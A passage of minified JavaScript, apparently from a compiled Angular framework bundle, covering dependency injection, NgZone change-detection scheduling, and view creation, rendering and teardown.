d}c=e[a+8],c!==Fr&&tm(r,e[k].data[a+8]===l)&&em(o,a,e)?(s=u,a=fa(c),e=pa(c,e)):a=-1}}return i}function aS(t,e,n,r,i,o){let s=e[k],a=s.data[t+8],c=r==null?Na(a)&&vu:r!=s&&(a.type&3)!==0,l=i&M.Host&&o===a,u=cS(a,s,n,c,l);return u!==null?$r(e,s,u,a):dt}function cS(t,e,n,r,i){let o=t.providerIndexes,s=e.data,a=o&1048575,c=t.directiveStart,l=t.directiveEnd,u=o>>20,d=r?a:a+u,h=i?a+u:l;for(let f=d;f<h;f++){let g=s[f];if(f<c&&n===g||f>=c&&g.type===n)return f}if(i){let f=s[c];if(f&&cn(f)&&f.type===n)return c}return null}function $r(t,e,n,r){let i=t[n],o=e.data;if(eS(i)){let s=i;s.resolving&&VD(LD(o[n]));let a=Xg(s.canSeeViewProviders);s.resolving=!0;let c,l=s.injectImpl?je(s.injectImpl):null,u=cv(t,r,M.Default);try{i=t[n]=s.factory(void 0,o,t,r),e.firstCreatePass&&n>=r.directiveStart&&Jb(n,o[n],e)}finally{l!==null&&je(l),Xg(a),s.resolving=!1,hv()}}return i}function lS(t){if(typeof t=="string")return t.charCodeAt(0)||0;let e=t.hasOwnProperty(zi)?t[zi]:void 0;return typeof e=="number"?e>=0?e&_v:uS:e}function em(t,e,n){let r=1<<t;return!!(n[e+(t>>Iv)]&r)}function tm(t,e){return!(t&M.Self)&&!(t&M.Host&&e)}var On=class{constructor(e,n){this._tNode=e,this._lView=n}get(e,n,r){return Dv(this._tNode,this._lView,e,Sa(r),n)}};function uS(){return new On(We(),me())}function Wn(t){return eo(()=>{let e=t.prototype.constructor,n=e[ia]||_u(e),r=Object.prototype,i=Object.getPrototypeOf(t.prototype).constructor;for(;i&&i!==r;){let o=i[ia]||_u(i);if(o&&o!==n)return o;i=Object.getPrototypeOf(i)}return o=>new o})}function _u(t){return Em(t)?()=>{let e=_u(De(t));return e&&e()}:Lr(t)}function dS(t,e,n,r,i){let o=t,s=e;for(;o!==null&&s!==null&&s[b]&2048&&!(s[b]&512);){let a=bv(o,s,n,r|M.Self,dt);if(a!==dt)return a;let c=o.parent;if(!c){let l=s[Wm];if(l){let u=l.get(n,dt,r);if(u!==dt)return u}c=Sv(s),s=s[no]}o=c}return i}function Sv(t){let e=t[k],n=e.type;return n===2?e.declTNode:n===1?t[nt]:null}function nm(t,e=null,n=null,r){let i=Tv(t,e,n,r);return i.resolveInjectorInitializers(),i}function Tv(t,e=null,n=null,r,i=new Set){let o=[n||Ue,Yu(t)];return r=r||(typeof t=="object"?void 0:Te(t)),new Yi(o,e||Zu(),r||null,i)}var Me=class t{static{this.THROW_IF_NOT_FOUND=Gi}static{this.NULL=new aa}static create(e,n){if(Array.isArray(e))return nm({name:""},n,e,"");{let r=e.name??"";return nm({name:r},e.parent,e.providers,r)}}static{this.\u0275prov=E({token:t,providedIn:"any",factory:()=>N(Nm)})}static{this.__NG_ELEMENT_ID__=-1}};var hS=new I("");hS.__NG_ELEMENT_ID__=t=>{let e=We();if(e===null)throw new w(204,!1);if(e.type&2)return e.value;if(t&M.Optional)return null;throw new w(204,!1)};var fS="ngOriginalError";function Ql(t){return t[fS]}var Av=!0,Mv=(()=>{class t{static{this.__NG_ELEMENT_ID__=pS}static{this.__NG_ENV_ID__=n=>n}}return t})(),Iu=class extends Mv{constructor(e){super(),this._lView=e}onDestroy(e){return tv(this._lView,e),()=>Ob(this._lView,e)}};function pS(){return new Iu(me())}var Zr=(()=>{class t{constructor(){this.taskId=0,this.pendingTasks=new Set,this.hasPendingTasks=new ge(!1)}get _hasPendingTasks(){return this.hasPendingTasks.value}add(){this._hasPendingTasks||this.hasPendingTasks.next(!0);let n=this.taskId++;return this.pendingTasks.add(n),n}remove(n){this.pendingTasks.delete(n),this.pendingTasks.size===0&&this._hasPendingTasks&&this.hasPendingTasks.next(!1)}ngOnDestroy(){this.pendingTasks.clear(),this._hasPendingTasks&&this.hasPendingTasks.next(!1)}static{this.\u0275prov=E({token:t,providedIn:"root",factory:()=>new t})}}return t})();var wu=class extends pe{constructor(e=!1){super(),this.destroyRef=void 0,this.pendingTasks=void 0,this.__isAsync=e,Db()&&(this.destroyRef=y(Mv,{optional:!0})??void 0,this.pendingTasks=y(Zr,{optional:!0})??void 0)}emit(e){let n=H(null);try{super.next(e)}finally{H(n)}}subscribe(e,n,r){let i=e,o=n||(()=>null),s=r;if(e&&typeof e=="object"){let c=e;i=c.next?.bind(c),o=c.error?.bind(c),s=c.complete?.bind(c)}this.__isAsync&&(o=this.wrapInTimeout(o),i&&(i=this.wrapInTimeout(i)),s&&(s=this.wrapInTimeout(s)));let a=super.subscribe({next:i,error:o,complete:s});return e instanceof re&&e.add(a),a}wrapInTimeout(e){return n=>{let r=this.pendingTasks?.add();setTimeout(()=>{e(n),r!==void 0&&this.pendingTasks?.remove(r)})}}},se=wu;function ma(...t){}function Nv(t){let e,n;function r(){t=ma;try{n!==void 0&&typeof cancelAnimationFrame=="function"&&cancelAnimationFrame(n),e!==void 0&&clearTimeout(e)}catch{}}return e=setTimeout(()=>{t(),r()}),typeof requestAnimationFrame=="function"&&(n=requestAnimationFrame(()=>{t(),r()})),()=>r()}function rm(t){return queueMicrotask(()=>t()),()=>{t=ma}}var td="isAngularZone",va=td+"_ID",gS=0,Y=class t{constructor(e){this.hasPendingMacrotasks=!1,this.hasPendingMicrotasks=!1,this.isStable=!0,this.onUnstable=new se(!1),this.onMicrotaskEmpty=new se(!1),this.onStable=new se(!1),this.onError=new se(!1);let{enableLongStackTrace:n=!1,shouldCoalesceEventChangeDetection:r=!1,shouldCoalesceRunChangeDetection:i=!1,scheduleInRootZone:o=Av}=e;if(typeof Zone>"u")throw new w(908,!1);Zone.assertZonePatched();let s=this;s._nesting=0,s._outer=s._inner=Zone.current,Zone.TaskTrackingZoneSpec&&(s._inner=s._inner.fork(new Zone.TaskTrackingZoneSpec)),n&&Zone.longStackTraceZoneSpec&&(s._inner=s._inner.fork(Zone.longStackTraceZoneSpec)),s.shouldCoalesceEventChangeDetection=!i&&r,s.shouldCoalesceRunChangeDetection=i,s.callbackScheduled=!1,s.scheduleInRootZone=o,yS(s)}static isInAngularZone(){return typeof Zone<"u"&&Zone.current.get(td)===!0}static assertInAngularZone(){if(!t.isInAngularZone())throw new w(909,!1)}static assertNotInAngularZone(){if(t.isInAngularZone())throw new w(909,!1)}run(e,n,r){return this._inner.run(e,n,r)}runTask(e,n,r,i){let o=this._inner,s=o.scheduleEventTask("NgZoneEvent: "+i,e,mS,ma,ma);try{return o.runTask(s,n,r)}finally{o.cancelTask(s)}}runGuarded(e,n,r){return this._inner.runGuarded(e,n,r)}runOutsideAngular(e){return this._outer.run(e)}},mS={};function nd(t){if(t._nesting==0&&!t.hasPendingMicrotasks&&!t.isStable)try{t._nesting++,t.onMicrotaskEmpty.emit(null)}finally{if(t._nesting--,!t.hasPendingMicrotasks)try{t.runOutsideAngular(()=>t.onStable.emit(null))}finally{t.isStable=!0}}}function vS(t){if(t.isCheckStableRunning||t.callbackScheduled)return;t.callbackScheduled=!0;function e(){Nv(()=>{t.callbackScheduled=!1,Eu(t),t.isCheckStableRunning=!0,nd(t),t.isCheckStableRunning=!1})}t.scheduleInRootZone?Zone.root.run(()=>{e()}):t._outer.run(()=>{e()}),Eu(t)}function yS(t){let e=()=>{vS(t)},n=gS++;t._inner=t._inner.fork({name:"angular",properties:{[td]:!0,[va]:n,[va+n]:!0},onInvokeTask:(r,i,o,s,a,c)=>{if(_S(c))return r.invokeTask(o,s,a,c);try{return im(t),r.invokeTask(o,s,a,c)}finally{(t.shouldCoalesceEventChangeDetection&&s.type==="eventTask"||t.shouldCoalesceRunChangeDetection)&&e(),om(t)}},onInvoke:(r,i,o,s,a,c,l)=>{try{return im(t),r.invoke(o,s,a,c,l)}finally{t.shouldCoalesceRunChangeDetection&&!t.callbackScheduled&&!IS(c)&&e(),om(t)}},onHasTask:(r,i,o,s)=>{r.hasTask(o,s),i===o&&(s.change=="microTask"?(t._hasPendingMicrotasks=s.microTask,Eu(t),nd(t)):s.change=="macroTask"&&(t.hasPendingMacrotasks=s.macroTask))},onHandleError:(r,i,o,s)=>(r.handleError(o,s),t.runOutsideAngular(()=>t.onError.emit(s)),!1)})}function Eu(t){t._hasPendingMicrotasks||(t.shouldCoalesceEventChangeDetection||t.shouldCoalesceRunChangeDetection)&&t.callbackScheduled===!0?t.hasPendingMicrotasks=!0:t.hasPendingMicrotasks=!1}function im(t){t._nesting++,t.isStable&&(t.isStable=!1,t.onUnstable.emit(null))}function om(t){t._nesting--,nd(t)}var Cu=class{constructor(){this.hasPendingMicrotasks=!1,this.hasPendingMacrotasks=!1,this.isStable=!0,this.onUnstable=new se,this.onMicrotaskEmpty=new se,this.onStable=new se,this.onError=new se}run(e,n,r){return e.apply(n,r)}runGuarded(e,n,r){return e.apply(n,r)}runOutsideAngular(e){return e()}runTask(e,n,r,i){return e.apply(n,r)}};function _S(t){return Rv(t,"__ignore_ng_zone__")}function IS(t){return Rv(t,"__scheduler_tick__")}function Rv(t,e){return!Array.isArray(t)||t.length!==1?!1:t[0]?.data?.[e]===!0}var At=class{constructor(){this._console=console}handleError(e){let n=this._findOriginalError(e);this._console.error("ERROR",e),n&&this._console.error("ORIGINAL ERROR",n)}_findOriginalError(e){let n=e&&Ql(e);for(;n&&Ql(n);)n=Ql(n);return n||null}},wS=new I("",{providedIn:"root",factory:()=>{let t=y(Y),e=y(At);return n=>t.runOutsideAngular(()=>e.handleError(n))}});function ES(){return rd(We(),me())}function rd(t,e){return new kt(rt(t,e))}var kt=(()=>{class t{constructor(n){this.nativeElement=n}static{this.__NG_ELEMENT_ID__=ES}}return t})();function xv(t){return(t.flags&128)===128}var Ov=new Map,CS=0;function DS(){return CS++}function bS(t){Ov.set(t[Ma],t)}function Du(t){Ov.delete(t[Ma])}var sm="__ngContext__";function Hr(t,e){sn(e)?(t[sm]=e[Ma],bS(e)):t[sm]=e}function Pv(t){return Fv(t[Ki])}function kv(t){return Fv(t[tt])}function Fv(t){for(;t!==null&&!Ot(t);)t=t[tt];return t}var bu;function Lv(t){bu=t}function SS(){if(bu!==void 0)return bu;if(typeof document<"u")return document;throw new w(210,!1)}var id=new I("",{providedIn:"root",factory:()=>TS}),TS="ng",od=new I(""),hn=new I("",{providedIn:"platform",factory:()=>"unknown"});var sd=new I("",{providedIn:"root",factory:()=>SS().body?.querySelector("[ngCspNonce]")?.getAttribute("ngCspNonce")||null});var AS="h",MS="b";var NS=()=>null;function ad(t,e,n=!1){return NS(t,e,n)}var Vv=!1,RS=new I("",{providedIn:"root",factory:()=>Vv});var Ks;function xS(){if(Ks===void 0&&(Ks=null,iu.trustedTypes))try{Ks=iu.trustedTypes.createPolicy("angular",{createHTML:t=>t,createScript:t=>t,createScriptURL:t=>t})}catch{}return Ks}function OS(t){return xS()?.createScriptURL(t)||t}var Su=class{constructor(e){this.changingThisBreaksApplicationSecurity=e}toString(){return`SafeValue must use [property]=binding: ${this.changingThisBreaksApplicationSecurity} (see ${bD})`}};function cd(t){return t instanceof Su?t.changingThisBreaksApplicationSecurity:t}function jv(t){return OS(t[0])}function Uv(t){return t instanceof Function?t():t}var Mt=function(t){return t[t.Important=1]="Important",t[t.DashCase=2]="DashCase",t}(Mt||{}),PS;function ld(t,e){return PS(t,e)}function Pr(t,e,n,r,i){if(r!=null){let o,s=!1;Ot(r)?o=r:sn(r)&&(s=!0,r=r[xt]);let a=pt(r);t===0&&n!==null?i==null?zv(e,n,a):ya(e,n,a,i||null,!0):t===1&&n!==null?ya(e,n,a,i||null,!0):t===2?YS(e,a,s):t===3&&e.destroyNode(a),o!=null&&ZS(e,t,o,n,i)}}function kS(t,e){return t.createText(e)}function Bv(t,e,n){return t.createElement(e,n)}function FS(t,e){$v(t,e),e[xt]=null,e[nt]=null}function LS(t,e,n,r,i,o){r[xt]=i,r[nt]=e,Pa(t,r,n,1,i,o)}function $v(t,e){e[Tt].changeDetectionScheduler?.notify(9),Pa(t,e,e[Ae],2,null,null)}function VS(t){let e=t[Ki];if(!e)return Jl(t[k],t);for(;e;){let n=null;if(sn(e))n=e[Ki];else{let r=e[$e];r&&(n=r)}if(!n){for(;e&&!e[tt]&&e!==t;)sn(e)&&Jl(e[k],e),e=e[be];e===null&&(e=t),sn(e)&&Jl(e[k],e),n=e&&e[tt]}e=n}}function jS(t,e,n,r){let i=$e+r,o=n.length;r>0&&(n[i-1][tt]=e),r<o-$e?(e[tt]=n[i],Mm(n,$e+r,e)):(n.push(e),e[tt]=null),e[be]=n;let s=e[Zi];s!==null&&n!==s&&Hv(s,e);let a=e[Aa];a!==null&&a.insertView(t),pu(e),e[b]|=128}function Hv(t,e){let n=t[da],r=e[be];if(sn(r))t[b]|=ha.HasTransplantedViews;else{let i=r[be][ft];e[ft]!==i&&(t[b]|=ha.HasTransplantedViews)}n===null?t[da]=[e]:n.push(e)}function ud(t,e){let n=t[da],r=n.indexOf(e);n.splice(r,1)}function Tu(t,e){if(t.length<=$e)return;let n=$e+e,r=t[n];if(r){let i=r[Zi];i!==null&&i!==t&&ud(i,r),e>0&&(t[n-1][tt]=r[tt]);let o=sa(t,$e+e);FS(r[k],r);let s=o[Aa];s!==null&&s.detachView(o[k]),r[be]=null,r[tt]=null,r[b]&=-129}return r}function Wv(t,e){if(!(e[b]&256)){let n=e[Ae];n.destroyNode&&Pa(t,e,n,3,null,null),VS(e)}}function Jl(t,e){if(e[b]&256)return;let n=H(null);try{e[b]&=-129,e[b]|=256,e[Be]&&El(e[Be]),BS(t,e),US(t,e),e[k].type===1&&e[Ae].destroy();let r=e[Zi];if(r!==null&&Ot(e[be])){r!==e[be]&&ud(r,e);let i=e[Aa];i!==null&&i.detachView(t)}Du(e)}finally{H(n)}}function US(t,e){let n=t.cleanup,r=e[la];if(n!==null)for(let o=0;o<n.length-1;o+=2)if(typeof n[o]=="string"){let s=n[o+3];s>=0?r[s]():r[-s].unsubscribe(),o+=2}else{let s=r[n[o+1]];n[o].call(s)}r!==null&&(e[la]=null);let i=e[on];if(i!==null){e[on]=null;for(let o=0;o<i.length;o++){let s=i[o];s()}}}function BS(t,e){let n;if(t!=null&&(n=t.destroyHooks)!=null)for(let r=0;r<n.length;r+=2){let i=e[n[r]];if(!(i instanceof jn)){let o=n[r+1];if(Array.isArray(o))for(let s=0;s<o.length;s+=2){let a=i[o[s]],c=o[s+1];ut(4,a,c);try{c.call(a)}finally{ut(5,a,c)}}else{ut(4,i,o);try{o.call(i)}finally{ut(5,i,o)}}}}}function $S(t,e,n){return HS(t,e.parent,n)}function HS(t,e,n){let r=e;for(;r!==null&&r.type&168;)e=r,r=e.parent;if(r===null)return n[xt];{let{componentOffset:i}=r;if(i>-1){let{encapsulation:o}=t.data[r.directiveStart+i];if(o===ht.None||o===ht.Emulated)return null}return rt(r,n)}}function ya(t,e,n,r,i){t.insertBefore(e,n,r,i)}function zv(t,e,n){t.appendChild(e,n)}function am(t,e,n,r,i){r!==null?ya(t,e,n,r,i):zv(t,e,n)}function Gv(t,e){return t.parentNode(e)}function WS(t,e){return t.nextSibling(e)}function zS(t,e,n){return qS(t,e,n)}function GS(t,e,n){return t.type&40?rt(t,n):null}var qS=GS,cm;function qv(t,e,n,r){let i=$S(t,r,e),o=e[Ae],s=r.parent||e[nt],a=zS(s,r,e);if(i!=null)if(Array.isArray(n))for(let c=0;c<n.length;c++)am(o,i,n[c],a,!1);else am(o,i,n,a,!1);cm!==void 0&&cm(o,r,e,n,i)}function Hi(t,e){if(e!==null){let n=e.type;if(n&3)return rt(e,t);if(n&4)return Au(-1,t[e.index]);if(n&8){let r=e.child;if(r!==null)return Hi(t,r);{let i=t[e.index];return Ot(i)?Au(-1,i):pt(i)}}else{if(n&128)return Hi(t,e.next);if(n&32)return ld(e,t)()||pt(t[e.index]);{let r=Yv(t,e);if(r!==null){if(Array.isArray(r))return r[0];let i=Ln(t[ft]);return Hi(i,r)}else return Hi(t,e.next)}}}return null}function Yv(t,e){if(e!==null){let r=t[ft][nt],i=e.projection;return r.projection[i]}return null}function Au(t,e){let n=$e+t+1;if(n<e.length){let r=e[n],i=r[k].firstChild;if(i!==null)return Hi(r,i)}return e[Fn]}function YS(t,e,n){t.removeChild(null,e,n)}function dd(t,e,n,r,i,o,s){for(;n!=null;){if(n.type===128){n=n.next;continue}let a=r[n.index],c=n.type;if(s&&e===0&&(a&&Hr(pt(a),r),n.flags|=2),(n.flags&32)!==32)if(c&8)dd(t,e,n.child,r,i,o,!1),Pr(e,t,i,a,o);else if(c&32){let l=ld(n,r),u;for(;u=l();)Pr(e,t,i,u,o);Pr(e,t,i,a,o)}else c&16?KS(t,e,r,n,i,o):Pr(e,t,i,a,o);n=s?n.projectionNext:n.next}}function Pa(t,e,n,r,i,o){dd(n,r,t.firstChild,e,i,o,!1)}function KS(t,e,n,r,i,o){let s=n[ft],c=s[nt].projection[r.projection];if(Array.isArray(c))for(let l=0;l<c.length;l++){let u=c[l];Pr(e,t,i,u,o)}else{let l=c,u=s[be];xv(r)&&(l.flags|=128),dd(t,e,l,u,i,o,!0)}}function ZS(t,e,n,r,i){let o=n[Fn],s=pt(n);o!==s&&Pr(e,t,r,o,i);for(let a=$e;a<n.length;a++){let c=n[a];Pa(c[k],c,t,e,r,o)}}function QS(t,e,n,r,i){if(e)i?t.addClass(n,r):t.removeClass(n,r);else{let o=r.indexOf("-")===-1?void 0:Mt.DashCase;i==null?t.removeStyle(n,r,o):(typeof i=="string"&&i.endsWith("!important")&&(i=i.slice(0,-10),o|=Mt.Important),t.setStyle(n,r,i,o))}}function JS(t,e,n){t.setAttribute(e,"style",n)}function Kv(t,e,n){n===""?t.removeAttribute(e,"class"):t.setAttribute(e,"class",n)}function Zv(t,e,n){let{mergedAttrs:r,classes:i,styles:o}=n;r!==null&&cu(t,e,r),i!==null&&Kv(t,e,i),o!==null&&JS(t,e,o)}var ka={};function hd(t=1){Qv(Pt(),me(),ro()+t,!1)}function Qv(t,e,n,r){if(!r)if((e[b]&3)===3){let o=t.preOrderCheckHooks;o!==null&&ea(e,o,n)}else{let o=t.preOrderHooks;o!==null&&ta(e,o,0,n)}Vn(n)}function W(t,e=M.Default){let n=me();if(n===null)return N(t,e);let r=We();return Dv(r,n,De(t),e)}function Jv(t,e,n,r,i,o){let s=H(null);try{let a=null;i&an.SignalBased&&(a=e[r][Qt]),a!==null&&a.transformFn!==void 0&&(o=a.transformFn(o)),i&an.HasDecoratorInputTransform&&(o=t.inputTransforms[r].call(e,o)),t.setInput!==null?t.setInput(e,a,o,n,r):Ym(e,a,r,o)}finally{H(s)}}function XS(t,e){let n=t.hostBindingOpCodes;if(n!==null)try{for(let r=0;r<n.length;r++){let i=n[r];if(i<0)Vn(~i);else{let o=i,s=n[++r],a=n[++r];Gb(s,o);let c=e[o];a(2,c)}}}finally{Vn(-1)}}function fd(t,e,n,r,i,o,s,a,c,l,u){let d=e.blueprint.slice();return d[xt]=i,d[b]=r|4|128|8|64,(l!==null||t&&t[b]&2048)&&(d[b]|=2048),Xm(d),d[be]=d[no]=t,d[St]=n,d[Tt]=s||t&&t[Tt],d[Ae]=a||t&&t[Ae],d[Br]=c||t&&t[Br]||null,d[nt]=o,d[Ma]=DS(),d[ca]=u,d[Wm]=l,d[ft]=e.type==2?t[ft]:d,d}function pd(t,e,n,r,i){let o=t.data[e];if(o===null)o=eT(t,e,n,r,i),zb()&&(o.flags|=32);else if(o.type&64){o.type=n,o.value=r,o.attrs=i;let s=Ub();o.injectorIndex=s===null?-1:s.injectorIndex}return Oa(o,!0),o}function eT(t,e,n,r,i){let o=iv(),s=ov(),a=s?o:o&&o.parent,c=t.data[e]=aT(t,a,n,e,r,i);return t.firstChild===null&&(t.firstChild=c),o!==null&&(s?o.child==null&&c.parent!==null&&(o.child=c):o.next===null&&(o.next=c,c.prev=o)),c}function Xv(t,e,n,r){if(n===0)return-1;let i=e.length;for(let o=0;o<n;o++)e.push(r),t.blueprint.push(r),t.data.push(null);return i}function ey(t,e,n,r,i){let o=ro(),s=r&2;try{Vn(-1),s&&e.length>kn&&Qv(t,e,kn,!1),ut(s?2:0,i),n(r,i)}finally{Vn(o),ut(s?3:1,i)}}function ty(t,e,n){if(Gm(e)){let r=H(null);try{let i=e.directiveStart,o=e.directiveEnd;for(let s=i;s<o;s++){let a=t.data[s];if(a.contentQueries){let c=n[s];a.contentQueries(1,c,s)}}}finally{H(r)}}}function tT(t,e,n){rv()&&(gT(t,e,n,rt(n,e)),(n.flags&64)===64&&oy(t,e,n))}function nT(t,e,n=rt){let r=e.localNames;if(r!==null){let i=e.index+1;for(let o=0;o<r.length;o+=2){let s=r[o+1],a=s===-1?n(e,t):t[s];t[i++]=a}}}function ny(t){let e=t.tView;return e===null||e.incompleteFirstPass?t.tView=ry(1,null,t.template,t.decls,t.vars,t.directiveDefs,t.pipeDefs,t.viewQuery,t.schemas,t.consts,t.id):e}function ry(t,e,n,r,i,o,s,a,c,l,u){let d=kn+r,h=d+i,f=rT(d,h),g=typeof l=="function"?l():l;return f[k]={type:t,blueprint:f,template:n,queries:null,viewQuery:a,declTNode:e,data:f.slice().fill(null,d),bindingStartIndex:d,expandoStartIndex:h,hostBindingOpCodes:null,firstCreatePass:!0,firstUpdatePass:!0,staticViewQueries:!1,staticContentQueries:!1,preOrderHooks:null,preOrderCheckHooks:null,contentHooks:null,contentCheckHooks:null,viewHooks:null,viewCheckHooks:null,destroyHooks:null,cleanup:null,contentQueries:null,components:null,directiveRegistry:typeof o=="function"?o():o,pipeRegistry:typeof s=="function"?s():s,firstChild:null,schemas:c,consts:g,incompleteFirstPass:!1,ssrId:u}}function rT(t,e){let n=[];for(let r=0;r<e;r++)n.push(r<t?null:ka);return n}function iT(t,e,n,r){let o=r.get(RS,Vv)||n===ht.ShadowDom,s=t.selectRootElement(e,o);return oT(s),s}function oT(t){sT(t)}var sT=()=>null;function aT(t,e,n,r,i,o){let s=e?e.injectorIndex:-1,a=0;return Lb()&&(a|=128),{type:n,index:r,insertBeforeIndex:null,injectorIndex:s,directiveStart:-1,directiveEnd:-1,directiveStylingLast:-1,componentOffset:-1,propertyBindings:null,flags:a,providerIndexes:0,value:i,attrs:o,mergedAttrs:null,localNames:null,initialInputs:void 0,inputs:null,outputs:null,tView:null,next:null,prev:null,projectionNext:null,child:null,parent:e,projection:null,styles:null,stylesWithoutHost:null,residualStyles:void 0,classes:null,classesWithoutHost:null,residualClasses:void 0,classBindings:0,styleBindings:0}}function lm(t,e,n,r,i){for(let o in e){if(!e.hasOwnProperty(o))continue;let s=e[o];if(s===void 0)continue;r??={};let a,c=an.None;Array.isArray(s)?(a=s[0],c=s[1]):a=s;let l=o;if(i!==null){if(!i.hasOwnProperty(o))continue;l=i[o]}t===0?um(r,n,l,a,c):um(r,n,l,a)}return r}function um(t,e,n,r,i){let o;t.hasOwnProperty(n)?(o=t[n]).push(e,r):o=t[n]=[e,r],i!==void 0&&o.push(i)}function cT(t,e,n){let r=e.directiveStart,i=e.directiveEnd,o=t.data,s=e.attrs,a=[],c=null,l=null;for(let u=r;u<i;u++){let d=o[u],h=n?n.get(d):null,f=h?h.inputs:null,g=h?h.outputs:null;c=lm(0,d.inputs,u,c,f),l=lm(1,d.outputs,u,l,g);let _=c!==null&&s!==null&&!qu(e)?DT(c,u,s):null;a.push(_)}c!==null&&(c.hasOwnProperty("class")&&(e.flags|=8),c.hasOwnProperty("style")&&(e.flags|=16)),e.initialInputs=a,e.inputs=c,e.outputs=l}function lT(t){return t==="class"?"className":t==="for"?"htmlFor":t==="formaction"?"formAction":t==="innerHtml"?"innerHTML":t==="readonly"?"readOnly":t==="tabindex"?"tabIndex":t}function uT(t,e,n,r,i,o,s,a){let c=rt(e,n),l=e.inputs,u;!a&&l!=null&&(u=l[r])?(md(t,n,u,r,i),Na(e)&&dT(n,e.index)):e.type&3?(r=lT(r),i=s!=null?s(i,e.value||"",r):i,o.setProperty(c,r,i)):e.type&12}function dT(t,e){let n=dn(e,t);n[b]&16||(n[b]|=64)}function hT(t,e,n,r){if(rv()){let i=r===null?null:{"":-1},o=vT(t,n),s,a;o===null?s=a=null:[s,a]=o,s!==null&&iy(t,e,n,s,i,a),i&&yT(n,r,i)}n.mergedAttrs=qi(n.mergedAttrs,n.attrs)}function iy(t,e,n,r,i,o){for(let l=0;l<r.length;l++)yu(ga(n,e),t,r[l].type);IT(n,t.data.length,r.length);for(let l=0;l<r.length;l++){let u=r[l];u.providersResolver&&u.providersResolver(u)}let s=!1,a=!1,c=Xv(t,e,r.length,null);for(let l=0;l<r.length;l++){let u=r[l];n.mergedAttrs=qi(n.mergedAttrs,u.hostAttrs),wT(t,n,e,c,u),_T(c,u,i),u.contentQueries!==null&&(n.flags|=4),(u.hostBindings!==null||u.hostAttrs!==null||u.hostVars!==0)&&(n.flags|=64);let d=u.type.prototype;!s&&(d.ngOnChanges||d.ngOnInit||d.ngDoCheck)&&((t.preOrderHooks??=[]).push(n.index),s=!0),!a&&(d.ngOnChanges||d.ngDoCheck)&&((t.preOrderCheckHooks??=[]).push(n.index),a=!0),c++}cT(t,n,o)}function fT(t,e,n,r,i){let o=i.hostBindings;if(o){let s=t.hostBindingOpCodes;s===null&&(s=t.hostBindingOpCodes=[]);let a=~e.index;pT(s)!=a&&s.push(a),s.push(n,r,o)}}function pT(t){let e=t.length;for(;e>0;){let n=t[--e];if(typeof n=="number"&&n<0)return n}return 0}function gT(t,e,n,r){let i=n.directiveStart,o=n.directiveEnd;Na(n)&&ET(e,n,t.data[i+n.componentOffset]),t.firstCreatePass||ga(n,e),Hr(r,e);let s=n.initialInputs;for(let a=i;a<o;a++){let c=t.data[a],l=$r(e,t,a,n);if(Hr(l,e),s!==null&&CT(e,a-i,l,c,n,s),cn(c)){let u=dn(n.index,e);u[St]=$r(e,t,a,n)}}}function oy(t,e,n){let r=n.directiveStart,i=n.directiveEnd,o=n.index,s=qb();try{Vn(o);for(let a=r;a<i;a++){let c=t.data[a],l=e[a];gu(a),(c.hostBindings!==null||c.hostVars!==0||c.hostAttrs!==null)&&mT(c,l)}}finally{Vn(-1),gu(s)}}function mT(t,e){t.hostBindings!==null&&t.hostBindings(1,e)}function vT(t,e){let n=t.directiveRegistry,r=null,i=null;if(n)for(let o=0;o<n.length;o++){let s=n[o];if(ob(e,s.selectors,!1))if(r||(r=[]),cn(s))if(s.findHostDirectiveDefs!==null){let a=[];i=i||new Map,s.findHostDirectiveDefs(s,a,i),r.unshift(...a,s);let c=a.length;Mu(t,e,c)}else r.unshift(s),Mu(t,e,0);else i=i||new Map,s.findHostDirectiveDefs?.(s,r,i),r.push(s)}return r===null?null:[r,i]}function Mu(t,e,n){e.componentOffset=n,(t.components??=[]).push(e.index)}function yT(t,e,n){if(e){let r=t.localNames=[];for(let i=0;i<e.length;i+=2){let o=n[e[i+1]];if(o==null)throw new w(-301,!1);r.push(e[i],o)}}}function _T(t,e,n){if(n){if(e.exportAs)for(let r=0;r<e.exportAs.length;r++)n[e.exportAs[r]]=t;cn(e)&&(n[""]=t)}}function IT(t,e,n){t.flags|=1,t.directiveStart=e,t.directiveEnd=e+n,t.providerIndexes=e}function wT(t,e,n,r,i){t.data[r]=i;let o=i.factory||(i.factory=Lr(i.type,!0)),s=new jn(o,cn(i),W);t.blueprint[r]=s,n[r]=s,fT(t,e,r,Xv(t,n,i.hostVars,ka),i)}function ET(t,e,n){let r=rt(e,t),i=ny(n),o=t[Tt].rendererFactory,s=16;n.signals?s=4096:n.onPush&&(s=64);let a=gd(t,fd(t,i,null,s,r,e,null,o.createRenderer(r,n),null,null,null));t[e.index]=a}function CT(t,e,n,r,i,o){let s=o[e];if(s!==null)for(let a=0;a<s.length;){let c=s[a++],l=s[a++],u=s[a++],d=s[a++];Jv(r,n,c,l,u,d)}}function DT(t,e,n){let r=null,i=0;for(;i<n.length;){let o=n[i];if(o===0){i+=4;continue}else if(o===5){i+=2;continue}if(typeof o=="number")break;if(t.hasOwnProperty(o)){r===null&&(r=[]);let s=t[o];for(let a=0;a<s.length;a+=3)if(s[a]===e){r.push(o,s[a+1],s[a+2],n[i+1]);break}}i+=2}return r}function bT(t,e,n,r){return[t,!0,0,e,null,r,null,n,null,null]}function sy(t,e){let n=t.contentQueries;if(n!==null){let r=H(null);try{for(let i=0;i<n.length;i+=2){let o=n[i],s=n[i+1];if(s!==-1){let a=t.data[s];av(o),a.contentQueries(2,e[s],s)}}}finally{H(r)}}}function gd(t,e){return t[Ki]?t[Yg][tt]=e:t[Ki]=e,t[Yg]=e,e}function Nu(t,e,n){av(0);let r=H(null);try{e(t,n)}finally{H(r)}}function ST(t){return t[la]??=[]}function TT(t){return t.cleanup??=[]}function ay(t,e){let n=t[Br],r=n?n.get(At,null):null;r&&r.handleError(e)}function md(t,e,n,r,i){for(let o=0;o<n.length;){let s=n[o++],a=n[o++],c=n[o++],l=e[s],u=t.data[s];Jv(u,l,r,a,c,i)}}function AT(t,e){let n=dn(e,t),r=n[k];MT(r,n);let i=n[xt];i!==null&&n[ca]===null&&(n[ca]=ad(i,n[Br])),cy(r,n,n[St])}function MT(t,e){for(let n=e.length;n<t.blueprint.length;n++)e.push(t.blueprint[n])}function cy(t,e,n){Ju(e);try{let r=t.viewQuery;r!==null&&Nu(1,r,n);let i=t.template;i!==null&&ey(t,e,i,1,n),t.firstCreatePass&&(t.firstCreatePass=!1),e[Aa]?.finishViewCreation(t),t.staticContentQueries&&sy(t,e),t.staticViewQueries&&Nu(2,t.viewQuery,n);let o=t.components;o!==null&&NT(e,o)}catch(r){throw 